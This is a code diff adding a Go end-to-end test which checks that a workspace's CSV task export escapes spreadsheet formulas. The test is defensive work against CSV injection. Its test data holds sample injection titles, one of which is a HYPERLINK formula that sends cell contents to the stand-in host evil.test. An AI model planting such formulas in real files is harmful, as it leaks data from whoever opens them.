@@ -2,6 +2,7 @@ package e2e
 
 import (
 	"context"
+	"encoding/csv"
 	"io"
 	"net/http"
 	"strings"
@@ -479,4 +480,60 @@ func csvGet(t *testing.T, url, bearer string) (*http.Response, error) {
 	require.NoError(t, err)
 	req.Header.Set("Authorization", "Bearer "+bearer)
 	return http.DefaultClient.Do(req)
+}
+
+// TestExportCSVNeutralisesFormulas is the regression for a CSV that
+// executes when opened.
+//
+// Anyone who can name a task can leave a formula in the workspace, and
+// it stays inert until someone exports and opens the file — usually an
+// administrator, looking at everything. The exported cell must not
+// start with a character the spreadsheet reads as "evaluate this".
+func TestExportCSVNeutralisesFormulas(t *testing.T) {
+	bootstrap(t)
+	t.Parallel()
+
+	tt := newTenant(t)
+	csvURL := testServerURL + "/workspaces/" + tt.WorkspacePublicID + "/export/tasks.csv"
+
+	titles := []string{
+		`=HYPERLINK("http://evil.test/?"&A1,"click")`,
+		`+1+1`,
+		`-1+1`,
+		`@SUM(A1:A9)`,
+	}
+	for _, title := range titles {
+		doJSON(t, http.MethodPost, testServerURL+"/tasks", tt.AccessToken,
+			map[string]any{"projectId": tt.ProjectPublicID, "title": title}, nil)
+	}
+
+	resp, err := csvGet(t, csvURL, tt.AccessToken)
+	require.NoError(t, err)
+	defer func() { _ = resp.Body.Close() }()
+	raw, err := io.ReadAll(resp.Body)
+	require.NoError(t, err)
+	require.Equal(t, http.StatusOK, resp.StatusCode)
+
+	// Parse the file the way a spreadsheet does: quoting is removed
+	// before anything decides whether a cell is a formula, so the test
+	// has to look at the parsed values rather than the raw bytes.
+	body := strings.TrimPrefix(string(raw), "\xef\xbb\xbf")
+	records, err := csv.NewReader(strings.NewReader(body)).ReadAll()
+	require.NoError(t, err)
+
+	seen := 0
+	for _, record := range records {
+		for _, cell := range record {
+			if cell == "" {
+				continue
+			}
+			require.NotContainsf(t, "=+-@\t\r", string(cell[0]),
+				"a cell may not begin with a character a spreadsheet evaluates, got %q", cell)
+		}
+		if len(record) > 1 && strings.HasPrefix(record[1], "'") {
+			seen++
+		}
+	}
+	require.Equal(t, len(titles), seen,
+		"every planted formula must appear, escaped, or the test proved nothing")
 }
